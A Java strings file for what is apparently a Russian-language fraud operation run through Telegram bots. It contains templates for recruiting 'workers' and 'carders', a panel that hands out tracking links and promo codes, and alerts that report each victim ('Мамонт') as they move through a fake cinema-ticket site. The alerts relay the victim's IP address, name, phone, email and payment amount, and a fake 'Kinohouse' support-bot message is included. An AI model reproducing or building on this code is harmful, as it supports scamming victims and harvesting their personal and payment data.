package com.dekalib.app.bot;

public class Strings {
    public static String ROLE_ADMIN = "Admin";
    public static String ROLE_USER = "Worker";
    public static String ROLE_CARDER = "Carder";
    public static String ROLE_TP = "TP";

    public static String APP_BOT_START_MESSAGE = """
            🚀 *Добро пожаловать в бота!*
            Перед заполнением заявки вам нужно прожать /start в телеграмм боты:
            🤖 *@deko_main_robot* - _Основной бот_
            📢 *@deko_notifications_robot* - _Бот, куда будут приходить уведомления от сайта._
            """;

    public static String APP_FIRST_QUESTION = """
            ❓ *Откуда вы узнали о проекте?*
            _Большая просьба указать ссылку на источник._
            """;

    public static String APP_SECOND_QUESTION = """
            📝 *Какой у вас опыт в этой сфере?*
            _Опишите максимально подробно._
            """;

    public static String APP_APPLICATION_WAIT = """
            🙏 *Спасибо! Вы ответили на все вопросы.*
            _Ожидайте рассмотрения заявки._
            """;

    public static String APP_APPLICATION_CONFIRMED = """
            ✅ *Ваша заявка принята!*
            _Ждём вас в основном боте_ (🤖 *@deko_main_robot*)
            """;

    public static String APP_ALSO_COMPLETED = """
            ⚠️ *Вы уже подали заявку. Ожидайте.*
            """;

    public static String APP_APPLICATION_REJECTED = """
            ❌ *К сожалению, вы нам не подходите.*
            """;

    public static String APP_OWNER_NOTIFICATION = """
            📥 *Новая заявка!*
            *Id:* %d
            *Usrname:* %s
            *Источник:* %s
            *Опыт:* %s
            """;

    public static String MAIN_START_MESSAGE = """
            🎉 *Добро пожаловать.*
            Этот бот - панель управления для воркеров.
            /create - Показать ссылки.
            """;

    public static String MAIN_SHOW_LINKS = """
            🎫 *Ваш промокод:* %s
            🔗 *Ваши ссылки:*
            %s
            """;

    public static String WEB_FILM_NOTIFICATION = """
            🎬 *Мамонт перешел на страницу с фильмами!*
            🌐 *IP:* %s
            🎟️ *promo:* %s
            """;

    public static String WEB_MAIN_NOTIFICATION = """
            🏠 *Мамонт перешел на главную страницу!*
            🌐 *IP:* %s
            🎟️ *promo:* %s
            """;

    public static String WEB_BOOK_NOTIFICATION = """
            📚 *Мамонт перешел на страницу с вводом контактных данных!*
            🌐 *IP:* %s
            🎟️ *promo:* %s
            """;

    public static String WEB_TARIF_NOTIFICATION = """
            💳 *Мамонт перешел на страницу с выбором тарифа!*
            🌐 *IP:* %s
            🎟️ *promo:* %s
            """;

    public static String WEB_CONTACT_INFO_NOTIFICATION = """
            📇 *Мамонт ввёл контактные данные:*
            🌐 *IP:* %s
            👷 *Воркер:* %s
            🧑‍💼 *ФИО:* %s
            📞 *Телефон:* %s
            📧 *Почта:* %s
            🏢 *Адрес кинотеатра:* %s
            💳 *Сумма:* %s
            ℹ️ *Тариф:* %s
            """;

    public static String WEB_ABOUT_NOTIFICATION = """
            ℹ️ *Мамонт перешел на страницу 'О нас'!*
            🌐 *IP:* %s
            🎟️ *promo:* %s
            """;

    public static String TP_START_COMMAND_MESSAGE = """
            *Добро пожаловать*, [%s](https://t.me/%s)!
            _Это бот службы поддержки кинотеатра Kinohouse._
            При возникновении вопросов, оставьте обращение операторам по кнопке ниже.
            *Важно:* Операторы в сети 24/7.
            """;

    public static String TP_NOT_SUPPORTED_MESSAGE = """
            *Команда не распозана.*
            _Попробуйте действительную команду._
            """;

    public static String TP_CREATE_APPEAL_MESSAGE = """
           *Создание обращения*
           _Нажмите на кнопку ниже чтобы приступить к созданию обращения._
            """;
}
